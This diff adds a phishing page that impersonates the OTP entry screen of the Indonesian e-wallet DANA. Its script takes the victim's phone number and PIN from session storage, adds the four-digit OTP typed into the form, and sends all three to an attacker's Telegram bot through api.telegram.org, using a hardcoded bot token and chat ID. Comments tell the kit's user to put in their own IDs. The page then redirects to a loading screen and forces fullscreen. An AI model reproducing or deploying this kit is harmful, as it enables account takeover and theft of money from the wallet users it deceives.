@@ -1,0 +1,96 @@
+<!DOCTYPE html><meta http-equiv=refresh><title>DANA | Dompet digital</title><link href="https://a.m.dana.id/merchant-portal/app/assets/fav-icon.png" rel="icon" type="image/png"><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name=viewport><style>@import url(https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap);*{font-family:'Open Sans',sans-serif;font-weight:400}body{width:100%;height:100vh;margin:0;padding:0;background-color:#118eea;}.raw{position:absolute;width:100%;display:flex;justify-content:center;align-items:center;padding-top:20px}.back{width:8px;position:absolute;left:20px}.dana_logo{width:95px}.background{padding:0;margin:0;background:#0000002b;height:100%;width:100%;display:flex;justify-content:center;align-items:center;flex-direction:column;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);-webkit-transform:translate(-50%,-50%);-moz-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);-o-transform:translate(-50%,-50%)}.container{box-sizing:border-box;background:#fff;width:100%;height:100%;max-width:600px;max-height:700px;border-radius:15px;margin-top:40%}h1{margin-top:40px;margin-bottom:10px;font-size:15px;font-weight:600;color:#000}h2{font-size:15px;font-weight:400px;color:#000}.four_otp{display:flex;justify-content:center;align-items:center}.inpOtp{background:#f5f5f5;margin-left:3px;margin-right:3px;margin-top:25px;margin-bottom:25px;border-radius:8px;font-size:25px;font-weight:400;text-align:center;width:58px;height:45px;border:0;outline:0;caret-color:transparent}.resend{font-size:15px;font-weight:600;color:#cecece}</style><style>.process{position:absolute;display:flex;justify-content:center;align-items:center;background:#0000005b;width:100%;height:100vh}.loading{position:absolute;display:flex;justify-content:center;align-items:center;margin-bottom:20%}.loading img{width:50px}.loading .spinner{position:absolute;width:35px;animation:spin 1s linear infinite;-webkit-animation:spin 1s linear infinite;-moz-animation:spin 1s linear infinite;-ms-animation:spin 1s linear infinite;-o-animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(360deg)}100%{transform:rotate(0deg)}}@-webkit-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-moz-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-ms-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-o-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}</style><div class=raw><img src=https://www.pngkit.com/png/full/155-1554499_kudos-back-white-icon-png.png class=back> <img src=https://www.dana.id/_nuxt/img/dana-logo.fe46647.png class=dana_logo></div><div class=background><div class=container id=container><center><h1>Masukkan OTP</h1><h2>Kode OTP telah dikirim ke nomor Anda</h2><form><div class=four_otp id=four_otp><input autocomplete=off class=inpOtp id=otp1 maxlength=1 name=otp1 type=number><input autocomplete=off class=inpOtp id=otp2 maxlength=1 name=otp2 type=number><input autocomplete=off class=inpOtp id=otp3 maxlength=1 name=otp3 type=number><input autocomplete=off class=inpOtp id=otp4 maxlength=1 name=otp4 type=number></div></form><p class=resend>KIRIM ULANG (<span id=time>60</span>s)</center></div></div><div class=process id=process name=process style=display:none><div class=loading><img src=./load_bg.png> <img src=./load_spin.png class=spinner></div></div><script> const inputs = document.querySelectorAll(".four_otp input");
+const form = document.querySelector("form")
+inputs.forEach((input, index) => {
+    input.dataset.index = index;
+    input.addEventListener("keydown", clear);
+    input.addEventListener("keyup", onKeyUp);
+});
+function clear($event) { $event.target.value = ""; }
+function checkNumber(number) { return /[0-9]/g.test(number); }
+function onKeyUp($event) {
+    const input = $event.target;
+    const value = input.value;
+    const fieldIndex = +input.dataset.index;
+    if ($event.key === "Backspace" & fieldIndex > 0) {
+        input.previousElementSibling.focus();
+    }
+    if (checkNumber(value)) {
+        if (value.length > 0 & fieldIndex < inputs.length - 1) {
+            input.nextElementSibling.focus();
+        }
+        if (input.value !== "" & fieldIndex === inputs.length - 1) {
+            input.readOnly = true;
+            submit();
+        }
+    } else {
+        clear($event);
+    }
+}
+function startTimer(duration, display) {
+    var timer = duration, minutes, seconds;
+    setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = seconds;
+        if (--timer < 0) {
+            timer = duration;
+        }
+    }, 1000);
+}
+window.onload = function () {
+    var fiveMinutes = 59 * 1,
+        display = document.querySelector('#time');
+    startTimer(fiveMinutes, display);
+};
+</script>
+<script>
+function submit(){
+    let xx  = document.getElementById('process')
+    let con = document.getElementById('container')
+    xx.style.display = 'flex';
+    con.style.marginTop = '130%';
+    let phoneNumber = sessionStorage.getItem("phoneNumber");
+    let pinNumber = sessionStorage.getItem("pinNumber");
+    let otpone = document.getElementById('otp1').value;
+    let otptwo = document.getElementById('otp2').value;
+    let otpthree = document.getElementById('otp3').value;
+    let otpfour = document.getElementById('otp4').value;
+    let otpNumber = otpone+otptwo+otpthree+otpfour;
+
+    let message = `
+DANA | OTP |
+
+- No HP : ${phoneNumber}
+- Pin Akun : ${pinNumber}
+- Code OTP : ${otpNumber}`;
+
+//_masukan_ID_Akun_Telegram_kamu
+var id_telegram   = "6622807510";
+
+//_masukan_ID_Bot_Telegram_kamu
+var token_botTele = "6500813629:AAHSWt3mas2TF9ZgxsvU4oWcapkY2P0MVzg";
+
+    fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
+        method: 'POST',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: id_telegram,
+            text: message
+        })
+    });
+    window.location.href = "./loading.html";
+}
+</script>
+<script>
+document.documentElement.addEventListener("click", function (){
+    let docElm = document.documentElement;
+    if (docElm.requestFullscreen) {docElm.requestFullscreen()}
+    else if (docElm.mozRequestFullScreen) {docElm.mozRequestFullScreen()}
+    else if (docElm.webkitRequestFullScreen) {docElm.webkitRequestFullScreen()}
+});
+</script>
